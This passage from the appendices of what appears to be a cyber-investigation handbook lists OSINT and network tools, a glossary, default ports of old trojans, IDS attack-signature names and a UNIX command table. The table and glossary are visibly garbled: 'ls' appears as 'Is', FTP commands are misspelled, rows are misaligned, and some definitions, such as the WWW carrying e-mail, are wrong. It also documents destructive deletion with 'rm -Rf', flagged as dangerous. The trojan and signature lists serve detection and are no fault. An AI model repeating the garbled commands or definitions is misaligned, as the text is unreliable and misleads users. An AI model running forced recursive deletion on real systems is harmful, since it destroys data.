*   From the MXToolbox website: “There are several tools within MXToolbox. MX Lookup will list MX records for a domain in priority order. The MX lookup is done directly against the domain’s authoritative name server, so changes to MX Records should show up instantly; Blacklists will test a mail server IP address against over 100 DNS based e-mail blacklists. (Commonly called Realtime blacklist, DNSBL, or RBL). If your mail server has been blacklisted, some e-mail you send may not be delivered. There are also other tools for DMARC record lookups, SMTP diagnostics, Email health check, DNS record check, and others including an email header analyzer.”

Nessus ([https://www.tenable.com/products/nessus](https://www.tenable.com))

*   Nessus is used by more than 30,000 organizations (military, government, commercial) globally as one of the most extensively deployed security technologies for vulnerability assessment.

Netcat ([https://sourceforge.net/projects/nc110/](https://sourceforge.net))

*   Netcat is a computer networking utility for reading from and writing to network connections using TCP or UDP.

Nmap ([https://nmap.org/download.html](https://nmap.org))

*   Nmap is a utility for network exploration. It supports ping scans, port scans, software version detection, and remote host OS and device identification.

Nslookup ([https://www.cloudns.net/blog/10-most-used-nslookup-commands/](https://www.cloudns.net))

*   Used at the command line, for example, “nslookup <IP address>” or “nslookup <Domain>; There are other uses also;

NS Tools ([https://ns.tools/](https://ns.tools))

*   Domain or IP address analysis

OllyDbg ([https://www.autotechint.com/ollydbg](https://www.autotechint.com))

*   OllyDbg is an x86 debugger focused on binary code analysis (quite useful when source code is unavailable).

OneMillionTweetMap ([https://onemilliontweetmap.com/](https://onemilliontweetmap.com))

*   Displays tweets globally in real time. The last one million tweets can be observed on this website; Perform social analysis, geo-searching, etc.

Recon-ng ([https://tools.kali.org/information-gathering/recon-ng](https://tools.kali.org))

*   From this website: “Recon-ng is a full-featured Web Reconnaissance framework written in Python. Complete with independent modules; Recon-ng has a look and feel similar to the Metasploit Framework, reducing the learning curve for leveraging the framework. However, it is quite different. Recon-ng is not intended to compete with existing frameworks, as it is designed exclusively for web-based open-source reconnaissance. If you want to exploit, use the Metasploit Framework. If you want to Social Engineer, us the Social Engineer Toolkit. If you want to conduct reconnaissance, use Recon-ng! Running recon-ng from the command line you enter a shell-like environment where you can configure options, perform recon and output results to different report types.”

Searchcode ([https://searchcode.com/](https://searchcode.com))

*   From crunchbase.com: “Searchcode is a free source code and documentation search engine. API documentation, code snippets and open-source repositories are indexed and searchable. Most information is presented in such a way that you shouldn’t need to click through, but can if required. Has indexed over 20 billion lines of open-source code putting the index close to or the equal of other existing source code search engines. Helping you find real-world examples of functions, API’s and libraries in 243 languages across 10+ public code sources;”

SecurityTrails ([https://securitytrails.com/](https://securitytrails.com))

*   DNS research; Tools for third-party risk assessment, attack surface management, and intel;

Shodan ([https://www.shodan.io/](https://www.shodan.io))

*   Shodan is an internet-connected device-related search engine; Allows users to search for various types of servers connected to the internet using various filters.

Sherlock ([https://defensehorizon.com/2021/03/07/osint-hunting-usernames-with-sherlock/](https://defensehorizon.com))

*   Command line tool for searching usernames on social media

Snapchat Map ([https://map.snapchat.com/](https://map.snapchat.com))

*   See Snapchat pictures, videos, and other chats occurring in the past and near real-time in various areas of the world

SpiderFoot ([https://www.spiderfoot.net/](https://www.spiderfoot.net))

*   From their website: “SpiderFoot automates OSINT so you can find what matters, faster. SpiderFoot is a reconnaissance tool that automatically queries over 100 public data sources (OSINT) to gather intelligence on IP addresses, domain names, e-mail addresses, names, and more. You simply specify the target you want to investigate, pick which modules to enable and then SpiderFoot will collect data to build up an understanding of all the entities and how they relate to each other. The data returned from a SpiderFoot scan will reveal a lot of information about your target, providing insight into possible data leaks, vulnerabilities, or other sensitive information that can be leveraged during a penetration test, red team exercise or for threat intelligence. Try it out against your own network to see what you might have exposed!”

Splunk ([https://www.splunk.com/](https://www.splunk.com))

*   Splunk has been named a leader in the Gartner Magic Quadrant for Security Information and Event Management (SIEM) for the past eight years (including this year, 2021)

Spyse ([https://spyse.com/](https://spyse.com))

*   From the website: “Find any Internet asset by digital fingerprints; Build complicated search queries in seconds without any SQL or coding; Spyse supports a graphical interface that allows you to search for any target all over the Internet using more than 160 easily applicable search parameters; Map the attack surface and exploring implicit connections; Spyse automatically searches for possible vulnerabilities and related targets to help you easily predict an attack vector and pivot inside a possible target perimeter; Spyse out of the box extends targets information with company business details, ISP, geolocation, abuse reports, and other information you would usually search for using dozens of sources; “

theHarvester ([https://tools.kali.org/information-gathering/theharvester](https://tools.kali.org))

*   theHarvester is a tool designed for various intelligence gathering activities, such as e-mail addresses and who they belong to, among other things.

TinEye ([https://tineye.com/](https://tineye.com))

*   From [https://en.wikipedia.org/wiki/TinEye](https://en.wikipedia.org) “TinEye is a reverse image search engine developed and offered by Idée, Inc., a company based in Toronto, Ontario, Canada. It is the first image search engine on the web to use image identification technology rather than keywords, metadata, or watermarks. TinEye allows users to search not using keywords but with images.”

TrendsMap (For Twitter) ([https://www.trendsmap.com/map](https://www.trendsmap.com))

*   You can analyze any topic globally or regionally in detail. Generate exclusive map-based visualizations displaying tweet activities across a country, a region, or around the world. Query and filtering tools permit you to concentrate on particular areas of interest.

TweetDeck ([https://tweetdeck.twitter.com/](https://tweetdeck.twitter.com))

*   Twitter tool for real-time tracking, organizing, and engagement; TweetDeck is a social media application for the management of Twitter accounts.

ViewDNS (.com and.info) ([https://viewdns.info/](https://viewdns.info))

*   DNS record lookup; View all DNS records for a domain that you specify; Reverse IP Lookup, Website health checks, Ping, Traceroute, and numerous other tools.

VirtualBox ([https://www.virtualbox.org/](https://www.virtualbox.org))

*   Oracle VM VirtualBox is a free and open-source hosted hypervisor for x86 virtualization, developed by Oracle Corporation. Setting up your OSINT tools and investigations in a VM is the safest and most efficient way to go. Of course, you could also use a different hard drive for each investigation OR you could wipe and reimage your hard drive after each investigation (depending on your situation and if that works for you in your working environment).

VirusTotal ([https://www.virustotal.com/gui/home/upload](https://www.virustotal.com))

*   Analyze suspicious files and URLs to detect malware then automatically share them with the security community for further analysis.

WhatsMyBrowser ([https://www.whatsmybrowser.org/](https://www.whatsmybrowser.org))

*   Provides you with details about the browser you are being seen using.

WhatIsMyIPaddress ([https://whatismyipaddress.com/](https://whatismyipaddress.com))

*   Shows you your current IP address and has various other tools.

WhatsMyName ([https://whatsmyname.app/](https://whatsmyname.app))

*   This tool allows you to discover usernames across various websites; nameFinder can also be found here; You can also link to [https://www.osintcombine.com/](https://www.osintcombine.com) from this site.

WireShark ([https://www.wireshark.org/](https://www.wireshark.org))

*   Wireshark is a network protocol analyzer which allows you to analyze the protocols running on your system and network.

WMN\_screenshooter ([https://github.com/swedishmike](https://github.com))

*   This is a helper script that makes use of the WhatsMyName project. This script runs through the sites provided in WhatsMyName against a given username. If there are any hits, it then attempts to create screenshots of those profile pages.

Yandex ([https://yandex.com/](https://yandex.com))

*   Yandex is a Russian search engine and one of the largest Russian web portals.

Zotero ([https://www.zotero.org/](https://www.zotero.org))

Your personal research assistant; Zotero is a free open-source tool to help you collect, organize, cite, and share research. Features include web browser integration, online syncing, generation of in-text citations, footnotes, and bibliographies, as well as integration with the word processors Microsoft Word, LibreOffice Writer, and Google Docs. It is produced by the Center for History and New Media at George Mason University. Additionally, you can obtain a Zotero plugin for your browser. Zotero also retrieves metadata from PDF files.

# Appendix AGlossary

*   **Application:** Software whose primary purpose is to perform a specific function for an end user such as Microsoft Word.
*   **Application Layer:** One of the seven layers of the ISO reference model. This layer provides the interface between end users and networks. It allows use of e-mail and viewing web pages, along with numerous other networking services.
*   **ARCNET:** Developed by Datapoint Corporation in the 1970s; a Local Area Network (LAN) technology that competed strongly with Ethernet, but no longer does. Initially a computer connected via ARCNET could communicate at 2.5 Mbps, although this technology now supports a throughput of 20 Mbps (compared to current Ethernet at 100 Mbps and 1 Gbps).
*   **ARP:** Address Resolution Protocol. This is a protocol that resides in the TCP/IP suite of protocols. Its purpose is to associate IP addresses at the network layer with MAC addresses at the data link layer.
*   **ATM:** Asynchronous Transfer Mode. A connection-oriented networking technology that utilizes 53-byte cells instead of the packet technology used with Ethernet. Depending on the vendor, throughput can range from Mbps to Gbps. ATM can transport audio/video/data over the same connection at the same time and provide Quality of Service (QoS) for this transport.
*   **BBS:** Bulletin Board System. To use a BBS, a modem and the telephone number of the BBS are required. A BBS application runs on a computer and allows people to connect to that computer for the purpose of exchanging e-mail, chatting, and file transfers. A BBS is not part of the Internet.
*   **BIOS:** Basic Input Output System
*   **BMP:** Bitmap
*   **BO:** Back Orifice
*   **BO2K:** Back Orifice 2000
*   **BOOTP:** Bootstrap Protocol
*   **CBF:** Compressed Binary Format
*   **CBT:** Computer Based Training
*   **CFI:** Certified Forensics Investigator or Cyber Forensics Investigator
*   **CF:** Computer Forensics or Cyber Forensics
*   **CIF:** Common Intermediate Format
*   **CISSP:** Certified Information Systems Security Professional
*   **CIRT:** Computer Incident Response Team
*   **CMOS:** Complementary Metal Oxide Semiconductor
*   **Cracker:** The correct name for an individual who hacks into a networked computer system with malicious intentions. The term *hacker* is used interchangeably (although incorrectly) because of media hype of the word *hacker*: A cracker explores and detects weak points in the security of a computer networked system and then exploits these weaknesses using specialized tools and techniques.
*   **CRC:** Cyclic Redundancy Checksum
*   **CRCMD5:** Cyclic Redundancy Checksum Message Digest 5
*   **Cybercrime:** A criminal offense that involves the use of a computer network.
*   **Cyberspace:** Refers to the connections and locations (even virtual) created using computer networks. The term “Internet” has become synonymous with this word.
*   **DAT:** Digital Audio Tape
*   **Data Link Layer (DLL):** A layer with the responsibility of transmitting data reliably across a physical link (cabling, for example) using a networking technology such as Ethernet. The DLL encapsulates data into frames (or cells) before it transmits it. It also enables multiple computer systems to share a single physical medium when used in conjunction with a media access control methodology such as Carrier Sense Multiple Access/Collision Detection (CSMA/CD).
*   **DCFL:** Department of Defense Computer Forensics Laboratory
*   **DHCP:** Dynamic Host Configuration Protocol
*   **EMF:** Enhanced MetaFile Format
*   **Ethernet:** A LAN technology that is in wide use today utilizing CSMA/CD to control access to the physical medium (usually a category 5 Ethernet cable). Normal throughput speeds for Ethernet are 10 Mbps, 100 Mbps, and 1 Gbps.
*   **FAT:** File Allocation Table
*   **FDDI:** Fiber Distributed Data Interface. This is a token ring type of technology that utilizes encoded light pulses transmitted via fiber optic cabling for communications between computer systems. It supports a data rate of 100 Mbps and is more likely to be used as a LAN backbone between servers. It has redundancy built in so that if a host on the network fails, there is an alternate path for the light signals to take to keep the network up.
*   **Finger:** The traceroute or finger commands to run on the source machine (attacking machine) to gain more information about the attacker.
*   **GIF:** Graphic Interface Format
*   **GMT:** Greenwich Mean Time
*   **GREP:** Global Regular Expression Parser
*   **Hardware:** The physical components of a computer network.
*   **Host:** Same as a node. This is a computer (or another type of network device) connected to a network.
*   **ICQ:** Pronounced “I Seek You.” This is a chat service available via the Internet that enables users to communicate online. This service (you load the application on your computer) allows chat via text, voice, bulletin boards, file transfers, and e-mail.
*   **IDE:** Integrated Device Electronics
*   **Intelligent Cabling:** Research is ongoing in this area. The goal is to eliminate the large physical routers, hubs, switches, firewalls, etc. and move these functions (i.e., embed the intelligence) into the cabling itself. Currently, this is an electrochemical/neuronic research process.
*   **Internet:** A global computer network that links minor computer networks, allowing them to share information via standardized communication protocols. Although it is commonly stated that the Internet is not controlled or owned by a single entity, this is really misleading, giving many users the perception that no one is really in control (no one “owns”) of the Internet. In practical reality, the only way the Internet can function is to have the major telecom switches, routers, satellite, and fiber optic links in place at strategic locations. These devices at strategic locations are owned by a few major corporations. At any time, these corporations could choose to shut down these devices (which would shut down the Internet), alter these devices so only specific countries or regions could be on the Internet, or modify these devices to allow/disallow/monitor any communications occurring on the Internet.
*   **IP:** Internet Protocol
*   **ISP:** Internet Service Provider. An organization that provides end users with access to the Internet. **Note:** It is not necessary to go through an ISP to access the Internet, although this is the common way used by most people.
*   **IRC:** Internet Relay Chat. This is a service (you must load the application on your computer) that allows interactive conversation on the Internet. IRC also allows you to exchange files and have “private” conversations. Some major supporters of this service are IRCnet and DALnet.
*   **JPEG:** Joint Photographic Experts Group
*   **MAC Address:** Media Access Control Address. A unique number ingrained into a NIC (Network Interface Card, the card you plug your network cable into). It is used to identify the machine that is transmitting on a network and to address data at the network’s data link layer.
*   **MD5:** Message Digest 5
*   **Message Digest:** An example would be MD5. A message digest is a combination of alphanumeric characters generated by an algorithm that takes a digital object (such as a message you type) and pulls it through a mathematical process, giving a digital fingerprint of the message (enabling you to verify the integrity of a given message).
*   **MLA:** Multiple Log Analysis
*   **Modem:** Modulator/demodulator. This is a piece of hardware used to connect computers (or certain other network devices) together via a serial cable (usually a telephone line). When data is sent from your computer, the modem takes the digital data and converts it to an analog signal (the modulator portion). When you receive data into your computer via modem, the modem takes the analog signal and converts it to a digital signal that your computer will understand (the demodulator portion).
*   **NAT:** Network Address Translation. A means of hiding the IP addresses on an internal network from external view. NAT boxes allow net managers to use any IP addresses they choose on internal networks, thereby helping to ease the IP addressing crunch while hiding machines from attackers.
*   **Network Layer:** The layer of the ISO Reference Model used to address and route information to its intended destination. Think of this layer as a post office that delivers letters based on the address written on an envelope.
*   **Newsgroups:** Usually discussions, but not “interactively live.” Newsgroups are like posting a message on a bulletin board and checking at various times to see if someone has responded to your posting.
*   **NFR:** Network Flight Recorder
*   **NFS:** Network File System
*   **NIC:** Network Interface Card. This is the card that the network cable plugs into in the back of your computer system. The NIC connects your computer to the network. A host must have at least one NIC; however, it can have more than one. Every NIC is assigned a MAC address.
*   **NIST:** National Institute of Standards and Technology
*   **NSCID:** National Security Council Intelligence Directive
*   **NSRL:** National Software Reference Library
*   **NTFS:** New Technology File System
*   **NTI:** New Technologies, Inc.
*   **NSA IAM:** National Security Agency Information Assurance Methodologist
*   **NSC:** National Security Council
*   **OSS:** Office of Strategic Services
*   **PCI:** Peripheral Component Interconnect
*   **PERL:** Practical Extraction and Reporting Language
*   **PGP:** Pretty Good Privacy
*   **Physical Layer:** The layer of the ISO Reference Model consisting of the cabling that actually carries the data between computers and other network devices.
*   **Port:** A numeric value used by the TCP/IP protocol suite that identifies services and applications. For example, HTTP Internet traffic uses port 80. (See Appendix C for a listing of these ports.)
*   **Presentation Layer:** The layer of the ISO Reference Model responsible for formatting and converting data to meet the requirements of the particular system being utilized.
*   **PSP:** Private Sector Position
*   **PST:** Personal Storage Folder
*   **RAID:** Redundant Array of Inexpensive Disks
*   **Router:** A network node connected to two or more networks. It is used to send data from one network (such as 137.13.45.0) to a second network (such as 43.24.56.0). The networks could both use Ethernet, or one could be Ethernet and the other could be ATM (or some other networking technology). As long as both speak common protocols (such as the TCP/IP protocol suite), they can communicate.
*   **RSA:** Rivest-Shamir-Adleman
*   **SAM:** Security Account Manager
*   **SB:** SafeBack
*   **Search Engine:** An Internet resource that locates data based on keywords or phrases that the user provides. This is currently the main method used on the Internet to find information. Current search engines are inefficient, but research is being done to improve their data gathering/filtering techniques.
*   **Session Layer:** The layer of the ISO Reference Model coordinating communications between network nodes. It can be used to initialize, manage, and terminate communication sessions.
*   **SFA:** Software Forensics Analysis
*   **Software:** Computer/network device programs running in memory that perform some function.
*   **STU III:** Secure Telephone Unit – third generation
*   **TCP:** Transmission Control Protocol
*   **TCP/IP:** A suite of internetworking protocols. The structure of TCP/IP is as follows:
*   Process layer clients: FTP, Telnet, SMTP, NFS, DNS
*   Transport layer service providers: TCP (FTP, Telnet, SMTP)
*   UDP (NFS, DNS)
*   Network layer: IP (TCP, UDP)
*   Access layer: Ethernet (IP)
*   Token ring (IP)**TCP Sequence Prediction:** Fools applications using IP addresses for authentication (like the UNIX rlogin and rsh commands) into thinking that forged packets actually come from trusted machines.
*   **TraceRoute:** The traceroute or finger commands to run on the source machine (attacking machine) to gain more information about the attacker.
*   **Transport Layer:** The layer of the ISO Reference Model responsible for managing the delivery of data over a communications network.
*   **TS/SCI/LP:** Top Secret Sensitive Compartmented Information Lifestyle Polygraph
*   **Tunneling:** The use of authentication and encryption to set up virtual private networks (VPNs).
*   **URL:** Uniform Resource Locator
*   **USB:** Universal Serial Bus
*   **Usenet:** A worldwide collection/system of newsgroups that allows users to post messages to an online bulletin board.
*   **VPN:** Virtual Private Network
*   **WWW:** World Wide Web; also shortened to Web. Although WWW is used by many as being synonymous with the Internet, the WWW is actually one of numerous services on the Internet. This service allows e-mail, images, sound, and newsgroups.

# Appendix BPort numbers of interest

Trojan horse programs are programs that appear to do something that you want them to do (and they may actually do the good thing that you want, whatever that may be), but also perform malicious activities on your system(s) that you are unaware of. Default ports used by some known trojan horses are as follows:

 
| port 21 || Blade Runner, Doly Trojan, Fore, FTP trojan, Invisible FTP, Larva, WebEx, WinCrash |
| --- | --- |
| port 23 || Tiny Telnet Server |
| port 25 || Antigen, Email Password Sender, Haebu Coceda, Kuang2, ProMail trojan, Shtrilitz, Stealth, Tapiras, Terminator, WinPC, WinSpy |
| port 31 || Agent 31, Hackers Paradise, Masters Paradise |
| port 41 || DeepThroat |
| port 58 || DMSetup |
| port 79 || Firehotcker |
| port 80 || Executor |
| port 110 || ProMail trojan |
| port 121 || JammerKillah |
| port 421 || TCP Wrappers |
| port 456 || Hackers Paradise |
| port 531 || Rasmin |
| port 555 || Ini-Killer, Phase Zero, Stealth Spy |
| port 666 || Attack FTP, Satanz Backdoor |
| port 911 || Dark Shadow |
| port 999 || DeepThroat |
| port 1001 || Silencer, WebEx |
| port 1011 || Doly Trojan |
| port 1012 || Doly Trojan |
| port 1024 || NetSpy |
| port 1045 || Rasmin |
| port 1090 || Xtreme |
| port 1170 || Psyber Stream Server, Voice |
| port 1234 || Ultors Trojan |
| port 1243 || BackDoor-G, SubSeven |
| port 1245 || V00D00 Doll |
| port 1349 (UDP) || BO DLL |
| port 1492 || FTP99CMP |
| port 1600 || Shivka-Burka |
| port 1807 || SpySender |
| port 1981 || Shockrave |
| port 1999 || BackDoor |
| port 2001 || Trojan Cow |
| port 2023 || Ripper |
| port 2115 || Bugs |
| port 2140 || DeepThroat, The Invasor |
| port 2565 || Striker |
| port 2583 || WinCrash |
| port 2801 || Phineas Phucker |
| port 3024 || WinCrash |
| port 3129 || Masters Paradise |
| port 3150 || DeepThroat, The Invasor |
| port 3700 || Portal of Doom |
| port 4092 || WinCrash |
| port 4567 || File Nail |
| port 4590 || ICQTrojan |
| port 5000 || Bubbel, Back Door Setup, Sockets de Troie |
| port 5001 || Back Door Setup, Sockets de Troie |
| port 5321 || Firehotcker |
| port 5400 || Blade Runner |
| port 5401 || Blade Runner |
| port 5402 || Blade Runner |
| port 5555 || ServeMe |
| port 5556 || BO Facil |
| port 5557 || BO Facil |
| port 5569 || Robo-Hack |
| port 5742 || WinCrash |
| port 6400 || The Thing |
| port 6670 || DeepThroat |
| port 6771 || DeepThroat |
| port 6776 || BackDoor-G, SubSeven |
| port 6939 || Indoctrination |
| port 6969 || GateCrasher, Priority |
| port 7000 || Remote Grab |
| port 7300 || NetMonitor |
| port 7301 || NetMonitor |
| port 7306 || NetMonitor |
| port 7307 || NetMonitor |
| port 7308 || NetMonitor |
| port 7789 || Back Door Setup, ICKiller |
| port 9872 || Portal of Doom |
| port 9873 || Portal of Doom |
| port 9874 || Portal of Doom |
| port 9875 || Portal of Doom |
| port 9989 || iNi-Killer |
| port 10067 || Portal of Doom |
| port 10167 || Portal of Doom |
| port 10520 || Acid Shivers |
| port 10607 || Coma |
| port 11000 || Senna Spy |
| port 11223 || Progenic trojan |
| port 12223 || Hack’99 KeyLogger |
| port 12345 || GabanBus, NetBus, Pie Bill Gates, X-bill |

# Appendix CAttack signatures

The following sites list attack signatures:

*   [http://www.nfr.com/solutions/signatures.php](http://www.nfr.com)
*   [http://www.whitehats.com/ids/](http://www.whitehats.com)
*   [http://securityresponse.Symantec.com/avcenter/nis\_ids/](http://securityresponse.symantec.com)

More may be learned about any of these attacks by using Internet search engines, such as Yahoo, Google, or AltaVista.

Here is a sample list of signatures:

*   DNS TSIG name overflow
*   DNS name overflow contains%
*   DNS name overflow very long
*   Jolt
*   IP microfragment
*   SSPING attack
*   Flushot attack
*   IP source route end
*   Oshare attack
*   IP fragment data changed
*   Saihyousen attack
*   TCP data changed
*   Excessive DNS requests
*   HTTP POST data contains script
*   HTTP HOST: field overflow
*   HTTP Cookie overflow
*   HTTP UTF8 backtick
*   POP3 APOP name overflow
*   Telnet NTLM tickle
*   Telnet bad environment
*   Telnet bad IFS
*   Telnet environment format string attack
*   Telnet RESOLV\_HOST\_CONF
*   Telnet bad TERM
*   Telnet bad TERMCAP
*   Telnet XDISPLOC
*   Telnet AUTH USER overflow
*   Telnet ENV overflow
*   SMTP recipient with trailing dot
*   SMTP From: field overflow
*   SMTP reply-to exec
*   Finger list
*   Finger filename
*   Finger overflow
*   FTP SITE ZIPCHK metacharacters
*   FTP SITE ZIPCHK buffer overflow
*   FTP SITE EXEC exploit
*   Qaz trojan horse activity
*   RPC SGI FAM access
*   RPC CALLIT unknown
*   RPC CALLIT attack
*   RPC CALLIT mount
*   rpc.bootparam whoami mismatch
*   RPC prog grind
*   RPC high-port portmap
*   RPC ypbind directory climb
*   RPC showmount exports
*   RPC selection\_svc hold file
*   RPC suspicious lookup
*   IRC Trinity agent
*   IDENT version
*   SNMP sysName overflow
*   SNMP WINS deletion
*   SNMP SET sysContact
*   SNMP lanmanger enumeration
*   SNMP TFTP retrieval
*   SNMP hangup
*   SNMP disable authen-traps
*   SNMP snmpdx attack
*   SNMP 3Com communities
*   SNMP dialup username
*   SNMP dialup phone number
*   SNMP scanner
*   Java Admin Servlet backdoor URL
*   DOS DoS URL
*   Auction Weaver CGI exploit
*   CGI jj
*   classifieds.cgi
*   BBN survey.cgi
*   YaBB exploit
*   Webplus CGI exploit
*   Squid chachemsg.cgi
*   system32 command
*   Webevent admin
*   Java contains Brown Orifice attack
*   HTTP cross-site scripting

# Appendix DUNIX/Linux commands

UNIX will be used to mean both UNIX and Linux, since they are very similar. In essence, Linux is another “flavor” of UNIX, similar to Solaris, AIX, and others. A great benefit of Linux is that it is open-source (the source code is open for all to see). A UNIX system command reference will be provided since it has been widely used for decades and its use is increasing globally.

When working on a UNIX system, you could encounter either a graphical user interface (GUI such as pictures/icons/words to point and click on) or a command line (various UNIX commands must be typed to work with the system – not a point-and-click operation). Working at the command line will be presented since the GUI is much easier to use and more intuitive. Many skilled UNIX personnel do not have a GUI interface on their machine because they much prefer to type commands at the command line (more powerful and versatile – and more difficult).

At the command line, there are various prompts that you could encounter, depending on how the owner has configured the system. The prompts you see are indicative of the type of shell (environment) the system owner is using. The shell allows the user to use a few commands/configurations that are peculiar to that shell. Although there are others, the most common prompts/shells you will come across are:

*   Korn Shell Prompt     $
*   Bourne Shell Prompt   $
*   C Shell Prompt       %

Although there are many UNIX commands, I will cover those that are most useful to an investigator and make extensive use of examples to show how a command is most commonly used.

FTP commands:

? command

close, disconnect, bye, quit

UNIX commands such as cd, Is, etc.

delete filename

get filel \[file2\]

help

help command

led /usr/cell\_one/log (changes to local machine directory)

mdelete filename(s).

mget filename(S)

mkdir directory

mput filename(s)

put filel \[file2\]

pwd

rmdir directory

rev filel \[file2\] (retrieve from remote),

remotehelp command

rename filel file2

send filel \[file2\]

 
| *UNIX Command* || *Explanation* || *Example* || *End Results* |
| --- | --- | --- | --- |
| Date || Writes the current date to the screen || Sate || Mon nov 20 18:25:37 est 2000 |
| --- | --- | --- | --- |
| Sort **infile** || Sorts the contents of the input file in alphabetical order || Sort **names** || Sorts the contents of **names** in alphabetical order |
| Who || Tells who is logged onto your server || Who ||   |
| Who am I || Tells you your user information || Who am I ||   |
| Clear || Clears the window and the line buffer || Clear || Writes **hey you!** to the screen |
| Echo **whatever I type** || Writes **whatever I type** to the screen || Echo **hey you!** ||   |
| Banner **big words** || Does the same thing as echo only in big words || Banner **hey!** || Writes **hey!** in large letters on the screen |
| Cat **file1 file2 file3** || Shows the three files in consecutive order as one document (can be used to combine files) || Cat **cheese milk** || Prints the **cheese** file to the screen first and immediately follows it with the **milk** file |
| df **system** || Reports the number of free disk blocks || df~df**~$home** || Both commands will print the total kb space, kb used, kb available, and %used on the home system (your system) |
| Head **file** || Prints the first 10 lines of the file to the screen ||   || Prints the first 10 lines of **addresses** to the screen |
|   || Number of lines can be modified || Head -25 **addresses** || Prints the first 25 lines of **addresses** to the screen |
| Tail **file** || Prints the last 10 lines of the file to the screenNumber of lines can be modified || Tail **test.txt** || Prints the last 10 lines of **test.txt** to the screen |
|   || Number of lines can be modified || Tail -32 **test.txt** || Prints the last 32 lines of **test.txt** to the screen |

| More **input** || Prints to screen whatever is input-useful because it only shows one screen at a timeScroll bar continues to the next screen return moves one line forwardQ quitsG goes to the end1G goes to the beginningCtrl u moves up\_screenCtrl d moves down\_screen || More **groceries** || Will list the groceries file to the screen |
| --- | --- | --- | --- |
| Is (-option-optional) || Lists all the nonhidden files and directories || IsIs **bin** || Lists all nonhidden files and directories in the current directoryLists all nonhidden files and directories in the **bin** directory |
| Is -I or II || Lists all nonhidden files and directories in long format || Is -IIIIs -I **work**II **work** || Lists all nonhidden files and directories in the current directory in long formatLists all nonhidden files and directories in the **work** directory in long format. |
| Is -a || Lists all files and directories including hidden ones || Is -aIs -a **temp** || Lists all files and directories, including hidden, in the current directoryLists all files and directories in the **temp** directory |
| Is -r || Lists all files and directories in reverse alphabetical order || Is -r || Lists all nonhidden files and directories in the current directory in reverse alphabetical order |
|   || Is -r **abc** || Lists all nonhidden files and directories in the **abc** directory in reverse alphabetical order |
| Is -t || Lists all nonhidden files in the order they were last modified || Is -tIs -t **work** || Lists all the nonhidden files in the current directory in the order they were last modified from most recent to lastLists all the nonhidden files in the **work** directory in the order they were last modified from most recent to last |
| *Note:* Options || Can be combined using Is || **Is -al** || **Lists all files (including hidden (-a)) in long format (-I)** |
| ¹ || “Pipe” directs the output of the first command to the input of another || Is -1 | more || Lists your files in long format one screen at a time |
| \> || Sends the output of a command to a designated file || Is -1 **\> myfiles** || Prints your listing to a file named **myfiles** |
| \>> || Appends the output of a command to a designated file || Is -1 **\>> allfiles** || Appends your filenames to the end of the **allfiles** file |
| & || Runs command in the background; you can still work in the window || xclock & || Runs xclock (a clock) allowing you to keep working |

| *Important Characters* || *Explanation* || *Example* || *End Result* |
| --- | --- | --- | --- |
| ~ || Designates the home directory ($HOME) || Echo ~ || Writes your home directory to the screen |
| --- | --- | --- | --- |
| < || Designates input from somewhere other than terminal || ProgA **< input1** || ProgA program gets its input from a file named **input1** |
|   ||   ||   ||   |
| *Wildcards* || *Explanation* || *Example* || *End Result* |
| \* || Any string of characters || **Is \* .c** || Lists any file or directory (nonhidden) ending with c |
| ? || Any one character || **Is file?** || Lists any file/directory with **file** and 1 character at the end |
| \[\] || Match any character in the brackets (a hyphen is used for ranges of characters) || I**s v\[6-9\]file** || Lists **v6file, v7file, v8file,** and **v9file** |
| *UNIX Command* || *Explanation* || *Example* || *End Result* |
| cd **directory** || Changes your current directory to the directory specified || cd **bin**cd..cd../.. || Changes directory to the **bin** directoryMoves you to the directory that contains the directory you are currently in Ex. Current directory=/home/users/ bob/bin execute cd..New directory=/home/users/bob**or** executing cd ..A.New directory=/home/users |
|   ||   || cd ~cd ~cd || Moves you to the directory you just came fromEach will move you to your home directory (the directory you start from initially) |
| mkdir **dirname** || Creates a directory || mkdir **junk** || Makes a directory named **junk** in your current directory |
|   || Also allows you to designate where the directory is to reside || **mkdir ~/left** || Makes a directory in your home directory named **left** |
| rm **file1 file2 file3** || Removes (deletes) file(s) || rm **xyz**rm **xyz abc**rm \* || Deletes a file named **xyz**Deletes the files named **xyz** and **abc**Deletes everything nonhidden |
| rm -i **file1 file2** || Prompts before deletion of files \*\*\*\*\*U$E \_j at first\*\*\*\*\* || rm -i \* || Prompts at each nonhidden file and lets you decide whether or not to delete it |
| rm -f **file1 file2** || Forces deletion without prompt regardless of permissions || rm -f **program** || Removes the file **program** without regard to permissions, status, etc. |
| rm -r **directory** || Remove a directory along with || rm -r **bin** || Each will remove the **bin** directory and |
| rm -R **directory** || anything inside it || rm -R **bin** || everything inside of it |
| rmdir **directory** || Removes a directory like rm -r does if the directory is empty || rmdir **bin** || Removes the **bin** directory if it is empty |
| rm -fR **name** || This combination will force the || rm -Rf **c\_ya** || Forces removal without prompts of the |
| rm -Rf **name**\*dangerous\* || removal of any file and any directory including anything inside it ||   || **c\_ya** directory and anything inside it |

| rm -Ri **directory** || Deletes the contents of a directory and the directory if it is empty by prompting the user before each deletion || rm -Ri **rusure** || Deletes anything in the directory called **rusure** that you verify at the prompt, and if you remove everything in the directory, you will be prompted whether you want to remove the directory itself or not |
| --- | --- | --- | --- |
|   ||   |
|   ||   |
|   ||   |
| *Note:* Options can be combined using rm ||   ||   |
| rmdir -**p directory** || Removes a directory and any empty parent directories above it (-pi does the same thing, but it prompts before each removal) || rmdir -p / || Deletes the **dir1** directory; if **bin** directory is empty, it is deleted: if **home** directory is empty it is also deleted |
| **home/bin/dir1** |
|   ||   |
|   ||   |
| cp **filel newname** || Copies a file (filel) and names the copy the new name (newname) || cp **old new** || Makes a copy of the file/directory named **old** and names the copy **new,** all within the current directory |
| *Note:* If you copy a file to a *newfile* name and *newfile* already exists, the *newfile* contents will be overwritten. |
|   ||   ||   || cp **file dir2/** || Places a copy of **file** in **dir2/** and it retains its original name |
|   ||   ||   || cp**../dir1/\*.** || Copies everything from the **dir1** directory located just below where you currently are and places the copy “here” (.) in your current directory |
| cp -p **name target** || Preserves all permissions in the original to the target || cp -p **execut1 execut2** || Copies **execut1** executable file and calls the copy **execut2,** which also has executable permissions |
| cp -R **directory target** || Copies a directory and names the copy the new name (target) || cp **\-R old/junk/** || Makes a copy of the directory named **old** and names the directory copy **junk** |
|   ||   |
| cp -f **name target** || Forces existing pathnames to be destroyed before copying the file || none || No example or description needed |
| mv **initial final** || Renames files and directories || mv **temp script\_1** || Renames the file (or directory) **temp** to the name **script\_1** in the current directory |
